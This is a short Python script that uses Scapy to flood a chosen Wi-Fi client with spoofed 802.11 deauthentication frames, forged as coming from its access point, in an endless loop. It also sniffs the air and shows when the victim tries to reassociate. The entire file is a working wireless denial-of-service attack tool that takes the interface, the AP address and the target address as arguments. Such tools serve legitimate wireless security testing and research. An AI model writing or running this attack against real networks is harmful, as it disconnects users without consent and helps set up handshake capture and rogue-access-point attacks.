#!/usr/bin/env python
#Author: Storn
#
#Deauth a client from AP with client's state 
#(Reasso request) visualisation: 
#'_' = Deauth state
#'I' = Reasso request
#
#Use Scapy
#
#argv[1] = Monitor Interface
#argv[2] = Access Point @Mac
#argv[3] = Target @Mac
#

import sys
from scapy.all import *


if len(sys.argv) < 4:
  print "\n" + sys.argv[0] + " <Iface>  <AP Mac Addr>  <Target Mac Addr>\n"
  sys.exit()
else:
 device = sys.argv[1]
 ap = sys.argv[2]
 target = sys.argv[3]
 i = 0

 deauth = Dot11(addr1 = target, addr2 = ap, addr3 = ap)/Dot11Deauth()

 print "\n"

 while 1:
   deauth.FCfield = i+1
   try:
     sendp(RadioTap()/deauth, iface = device, verbose = 0)
   except:
     print "\n[-] Can't send Deauth Frame... Retry...\n"
     sys.exit()
   try:
     ans = sniff(iface = device, timeout = 1)
     etat = '_'
   except:
     print "\n[-] Can't launch sniffer... Retry...\n"
     sys.exit()
  
   for pck in ans:
     if(pck.haslayer(Dot11ReassoReq) and string.lower(pck[Dot11].addr2) == string.lower(target)):
       etat = 'I'
  
   sys.stdout.write(str(etat))
   sys.stdout.flush()
